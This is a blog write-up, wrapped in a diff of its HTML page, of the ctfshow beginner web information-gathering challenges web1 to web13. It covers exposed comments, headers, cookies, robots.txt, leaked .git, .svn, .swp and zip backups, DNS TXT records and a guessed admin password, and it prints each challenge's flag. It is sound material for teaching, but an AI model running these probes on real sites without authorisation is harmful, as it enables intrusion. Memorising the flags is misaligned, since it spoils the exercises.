@@ -1,0 +1,586 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="j0ker">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="信息收集web1网站注释泄露1web1:where is flag?  打开网站，查看源码，发现flag藏在源码注释里里 1234567891011121314&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;title&gt;CTFshow 新手入门题目 &lt;&#x2F;titl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow web入门做题记录">
+<meta property="og:url" content="http://example.com/2021/11/01/ctfshow/index.html">
+<meta property="og:site_name" content="j0ker&#39;s blog">
+<meta property="og:description" content="信息收集web1网站注释泄露1web1:where is flag?  打开网站，查看源码，发现flag藏在源码注释里里 1234567891011121314&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;&lt;title&gt;CTFshow 新手入门题目 &lt;&#x2F;titl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/cover/3.jpg">
+<meta property="article:published_time" content="2021-11-01T13:08:08.000Z">
+<meta property="article:modified_time" content="2022-01-14T09:53:37.664Z">
+<meta property="article:author" content="j0ker">
+<meta property="article:tag" content="ctfshow">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/cover/3.jpg">
+  
+  
+  <title>ctfshow web入门做题记录 - j0ker&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4/github-markdown.min.css" />
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hint.css@2/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.14","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>j0ker&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="ctfshow web入门做题记录">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-11-01 21:08" pubdate>
+        2021年11月1日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.5k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      38 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">ctfshow web入门做题记录</h1>
+            
+            <div class="markdown-body">
+              <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h4><h4 id="网站注释泄露"><a href="#网站注释泄露" class="headerlink" title="网站注释泄露"></a>网站注释泄露</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web1:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag?<br></code></pre></td></tr></table></figure>
+
+<p>打开网站，查看源码，发现flag藏在源码注释里里</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CTFshow 新手入门题目 <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>web1:where is flag?<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>	<span class="hljs-comment">&lt;!-- ctfshow&#123;bb9031ff-5fea-434d-a1be-33910335086a&#125; --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h4><h4 id="js前端拦截（禁止查看源代码）"><a href="#js前端拦截（禁止查看源代码）" class="headerlink" title="js前端拦截（禁止查看源代码）"></a>js前端拦截（禁止查看源代码）</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">无法显示源代码<br></code></pre></td></tr></table></figure>
+
+<p>页面显示无法查看源代码，按ctrl u也没有用，在url地址栏最前面输入view-source:并回车，则显示页面的源代码。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">HTML</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CTFshow 新手入门题目 <span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span><br><span class="javascript">	<span class="hljs-built_in">window</span>.oncontextmenu = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>&#125;;</span><br><span class="javascript">	<span class="hljs-built_in">window</span>.onselectstart = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>&#125;;</span><br><span class="javascript">	<span class="hljs-built_in">window</span>.onkeydown = <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-keyword">if</span> (event.keyCode==<span class="hljs-number">123</span>)&#123;event.keyCode=<span class="hljs-number">0</span>;event.returnValue=<span class="hljs-literal">false</span>;&#125;&#125;;</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>	<span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>无法查看源代码<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>	<span class="hljs-comment">&lt;!-- ctfshow&#123;b42c35c6-0a01-42fb-aeba-6dc934d35fed&#125; --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web3:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag?<br></code></pre></td></tr></table></figure>
+
+<p>按f12，我们可以发现，flag藏在响应头里。</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-meta">HTTP/1.1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>text/html; charset=UTF-8<br><span class="hljs-attribute">Date</span><span class="hljs-punctuation">: </span>Mon, 06 Sep 2021 02:56:22 GMT<br><span class="hljs-attribute">Flag</span><span class="hljs-punctuation">: </span>ctfshow&#123;77d13684-4b77-4131-bf47-6eaaeb46d419&#125;<br><span class="hljs-attribute">Server</span><span class="hljs-punctuation">: </span>nginx/1.16.1<br><span class="hljs-attribute">X-Powered-By</span><span class="hljs-punctuation">: </span>PHP/7.3.11<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>19<br></code></pre></td></tr></table></figure>
+
+<h4 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h4><h4 id="robots泄露"><a href="#robots泄露" class="headerlink" title="robots泄露"></a>robots泄露</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web4:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag?<br></code></pre></td></tr></table></figure>
+
+<p>我们在地址栏访问robots.txt，发现以下内容。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html">User-agent: *<br>Disallow: /flagishere.txt<br></code></pre></td></tr></table></figure>
+
+<p>接着我们访问url/flagishere.txt,发现flag。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">3</span>de<span class="hljs-number">3</span>be<span class="hljs-number">12</span>-<span class="hljs-number">5</span>b<span class="hljs-number">18</span>-<span class="hljs-number">45</span>c<span class="hljs-number">9</span>-<span class="hljs-number">9</span>d<span class="hljs-number">92</span>-<span class="hljs-number">31458</span>d<span class="hljs-number">7</span>c<span class="hljs-number">07</span>e<span class="hljs-number">4</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h4><h4 id="phps泄露（index-phps）"><a href="#phps泄露（index-phps）" class="headerlink" title="phps泄露（index.phps）"></a>phps泄露（index.phps）</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web5:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag ?<br></code></pre></td></tr></table></figure>
+
+<p>试着访问/index.phps，发现源码泄露。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;?php<br><br>/*<br># -*- coding: utf-8 -*-<br># @Author: h1xa<br># @Date:   2020-09-01 14:14:17<br># @Last Modified by:   h1xa<br># @Last Modified time: 2020-09-01 14:34:53<br># @email: h1xa@ctfer.com<br># @link: https://ctfer.com<br><br>*/<br><br>//ctfshow&#123;3f531588-7428-4e31-973f-841e438a8c69&#125;<br>echo &quot;web5:where is flag ?&quot;<br></code></pre></td></tr></table></figure>
+
+<h4 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h4><h4 id="源码泄露（www-zip）"><a href="#源码泄露（www-zip）" class="headerlink" title="源码泄露（www.zip）"></a>源码泄露（<a target="_blank" rel="noopener" href="http://www.zip)/">www.zip）</a></h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web6:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag?<br></code></pre></td></tr></table></figure>
+
+<p>在地址栏下访问/<a target="_blank" rel="noopener" href="http://www.zip,发现源码泄露.解压www.zip文件,发现有两个文件./">www.zip，发现源码泄露。解压www.zip文件，发现有两个文件。</a></p>
+<figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs axapta">fl000g.txt<br><span class="hljs-keyword">index</span>.php<br></code></pre></td></tr></table></figure>
+
+<p>打开index.php，发现提示。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-01 14:37:13</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-01 14:42:44</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span class="hljs-comment">//flag in fl000g.txt</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;web6:where is flag?&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>接着我们在地址栏访问fl000g.txt，发现flag。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;ffcc<span class="hljs-number">30</span>e<span class="hljs-number">9</span>-<span class="hljs-number">8</span>fb<span class="hljs-number">2</span>-<span class="hljs-number">4</span>ae<span class="hljs-number">7</span>-<span class="hljs-number">99</span>f<span class="hljs-number">6</span>-<span class="hljs-number">01</span>b<span class="hljs-number">53</span>b<span class="hljs-number">9641</span>f<span class="hljs-number">2</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h4><h4 id="git泄露（-git）"><a href="#git泄露（-git）" class="headerlink" title="git泄露（.git）"></a>git泄露（.git）</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web7:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag?<br></code></pre></td></tr></table></figure>
+
+<p>先扫下目录，发现有/.git泄露。接着我们直接用GitHack进行利用,结果利用失败。</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[+] Download and parse index file ...<br><span class="hljs-keyword">error: </span>Not a Git index file   <br></code></pre></td></tr></table></figure>
+
+<p>查看wp，发现在地址栏输入url/.git/index.php，即可得到flag。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">1</span>a<span class="hljs-number">97292</span>e-<span class="hljs-number">2</span>aba-<span class="hljs-number">40</span>ee-<span class="hljs-number">8</span>e<span class="hljs-number">2</span>a-<span class="hljs-number">5527799</span>be<span class="hljs-number">7</span>f<span class="hljs-number">9</span>&#125; <br></code></pre></td></tr></table></figure>
+
+<p>大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当，可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞，GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码。</p>
+<h4 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h4><h4 id="svn泄露（-svn）"><a href="#svn泄露（-svn）" class="headerlink" title="svn泄露（.svn）"></a>svn泄露（.svn）</h4><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">web8:</span><span class="hljs-keyword">where</span> <span class="hljs-built_in">is</span> flag?<br></code></pre></td></tr></table></figure>
+
+<p>在地址栏输入url/.svn/，得到flag。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">95</span>a<span class="hljs-number">26</span>e<span class="hljs-number">06</span>-a<span class="hljs-number">7</span>d<span class="hljs-number">2</span>-<span class="hljs-number">47</span>bb-<span class="hljs-number">8</span>db<span class="hljs-number">8</span>-<span class="hljs-number">1</span>de<span class="hljs-number">85</span>d<span class="hljs-number">2</span>a<span class="hljs-number">79</span>d<span class="hljs-number">4</span>&#125; <br></code></pre></td></tr></table></figure>
+
+<h4 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h4><h4 id="vim泄露（index-php-swp）"><a href="#vim泄露（index-php-swp）" class="headerlink" title="vim泄露（index.php.swp）"></a>vim泄露（index.php.swp）</h4><p>在地址栏输入url/index.php.swp,得到flag。</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">ctfshow&#123;f900f8c7-<span class="hljs-number">0938</span>-4cbf-921f-<span class="hljs-number">43048b291969</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h4><h4 id="cookie泄露（flag藏在cookie里）"><a href="#cookie泄露（flag藏在cookie里）" class="headerlink" title="cookie泄露（flag藏在cookie里）"></a>cookie泄露（flag藏在cookie里）</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">HTTP</span>/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> <span class="hljs-number">200</span> OK<br><span class="hljs-attribute">Content</span>-Type: text/html; charset=UTF-<span class="hljs-number">8</span><br><span class="hljs-attribute">Date</span>: Mon, <span class="hljs-number">06</span> Sep <span class="hljs-number">2021</span> <span class="hljs-number">11</span>:<span class="hljs-number">49</span>:<span class="hljs-number">37</span> GMT<br><span class="hljs-attribute">Server</span>: nginx/<span class="hljs-number">1</span>.<span class="hljs-number">16</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Set</span>-Cookie: flag=ctfshow%<span class="hljs-number">7</span>B<span class="hljs-number">235</span>cda<span class="hljs-number">01</span>-<span class="hljs-number">3</span>e<span class="hljs-number">30</span>-<span class="hljs-number">4724</span>-ab<span class="hljs-number">30</span>-<span class="hljs-number">1</span>b<span class="hljs-number">517</span>cf<span class="hljs-number">30064</span>%<span class="hljs-number">7</span>D<br><span class="hljs-attribute">X</span>-Powered-By: PHP/<span class="hljs-number">7</span>.<span class="hljs-number">3</span>.<span class="hljs-number">11</span><br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">20</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h4><h4 id="域名信息泄露"><a href="#域名信息泄露" class="headerlink" title="域名信息泄露"></a>域名信息泄露</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">域名其实也可以隐藏信息，比如ctfshow<span class="hljs-selector-class">.com</span> 就隐藏了一条信息<br></code></pre></td></tr></table></figure>
+
+<p>这里通过访问<a target="_blank" rel="noopener" href="https://zijian.aliyun.com/dns%E6%A3%80%E6%9F%A5%E6%9F%A5%E8%AF%A2TXT">https://zijian.aliyun.com/dns检查查询TXT</a> 记录（一般指为某个主机名或域名设置的说明），发现flag。</p>
+<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="xml">flag</span><span class="hljs-template-variable">&#123;just_seesee&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h4><h4 id="网站管理员密码泄露（-admin-index-php）"><a href="#网站管理员密码泄露（-admin-index-php）" class="headerlink" title="网站管理员密码泄露（/admin/index.php）"></a>网站管理员密码泄露（/admin/index.php）</h4><p>通过访问url/admin/index.php，发现需要密码登录，在主页最下面发现电话号码：372619038，尝试使用admin 372619038登录，登录成功，发现flag。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;<span class="hljs-number">32</span>bca<span class="hljs-number">6</span>b<span class="hljs-number">7</span>-eaf<span class="hljs-number">2</span>-<span class="hljs-number">48</span>b<span class="hljs-number">5</span>-a<span class="hljs-number">205</span>-<span class="hljs-number">98342</span>ae<span class="hljs-number">217</span>d<span class="hljs-number">3</span>&#125;<br></code></pre></td></tr></table></figure>
+
+<h4 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h4><h4 id="网站页面信息泄露（页面上有个document-点击有个下载）"><a href="#网站页面信息泄露（页面上有个document-点击有个下载）" class="headerlink" title="网站页面信息泄露（页面上有个document,点击有个下载）"></a>网站页面信息泄露（页面上有个document,点击有个下载）</h4><p>在网页最下面发现有document，点击下载文档，发现管理员账号密码，尝试登录，发现flag。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ctfshow</span>&#123;e<span class="hljs-number">58</span>f<span class="hljs-number">67</span>b<span class="hljs-number">7</span>-<span class="hljs-number">9</span>cf<span class="hljs-number">8</span>-<span class="hljs-number">4</span>fd<span class="hljs-number">2</span>-<span class="hljs-number">8812</span>-<span class="hljs-number">64</span>f<span class="hljs-number">4</span>caae<span class="hljs-number">909</span>e&#125;<br></code></pre></td></tr></table></figure>
+
